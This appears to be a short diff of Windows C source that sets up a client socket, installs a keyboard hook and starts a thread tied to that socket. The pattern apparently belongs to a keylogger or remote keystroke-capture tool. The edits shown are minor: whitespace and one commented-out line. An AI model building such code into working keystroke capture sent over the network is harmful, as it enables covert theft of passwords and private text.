@@ -126,7 +126,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);
 
-   client = InitSock();
+ client = InitSock();
    if (client == INVALID_SOCKET)
 	   return TRUE;
 
@@ -136,7 +136,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 
    res = SetKeyBoardHook(hWnd);
    CreateThread(NULL, NULL, proceThread, (LPVOID)client, 0, 0);
-  
+ 
    return TRUE;
 }
 
@@ -161,7 +161,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 	case WM_COPYDATA:
 	{
 						PackHeader PH;
-						PH.type = eKeyboard;
+//						PH.type = eKeyboard;
 						char buf[5] = { 0 };
 						if (!iskeyHook)
 							return 0;
